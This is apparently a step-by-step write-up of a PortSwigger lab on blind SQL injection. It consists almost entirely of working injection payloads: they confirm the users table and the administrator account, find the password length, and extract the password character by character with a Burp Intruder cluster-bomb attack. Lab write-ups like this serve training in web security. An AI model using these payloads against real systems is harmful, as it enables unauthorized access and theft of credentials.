# Blind SQL injection with conditional responses
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Step - 1
--------
'
-
Content Length Change
Single Quotes

Step - 2
--------
' AND '1'='1
------------
NO MySQL

Step - ?
--------
' AND (SELECT 'a' FROM users LIMIT 1)='a
----------------------------------------
Table Name: users (Just Confirm)

Step - ?
--------
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
---------------------------------------------------------------
Column Name: username (Just Confirm)
username Value: administrator (Just Confirm)

Step - 3
--------
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
---------------------------------------------------------------------------------------
Content Length Change
password Length: 20

Step - 4
--------
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
---------------------------------------------------------------------------------------
Attack Type: Cluster bomb
Payload Set 1: 1-20
Payload Set 2: a-z
